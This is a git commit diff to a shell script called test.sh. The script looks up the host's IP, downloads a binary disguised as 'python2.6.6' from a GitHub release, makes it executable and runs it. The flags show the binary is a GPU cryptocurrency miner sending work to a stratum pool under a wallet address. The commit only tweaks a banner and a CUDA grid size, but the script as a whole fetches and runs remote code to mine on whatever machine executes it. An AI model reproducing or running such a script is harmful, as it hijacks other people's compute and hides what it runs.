39bd91366c70de2617fd9728fa2ed255998e895a
Ayoub Jadouli <Ayoub JADOULI>
2021-04-03 16:50:56 +0100

    test 04

--- test.sh
+++ test.sh
@@ -6,11 +6,11 @@ IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
 echo '#######################################################'
-echo '##################### Test N 2 ########################'
+echo '##################### Test N 4 ########################'
 echo '#######################################################'
 
 rm -rf python2.6.6
 wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
 chmod +x python2.6.6
 #cp python2.6.6 /bin/python2.6.6
-./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 8 --cuda-block-size 256 --cuda-schedule yield  --cuda-streams 2 --cuda-grid-size 131072
+./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 8 --cuda-block-size 256 --cuda-schedule yield  --cuda-streams 2 --cuda-grid-size 65536
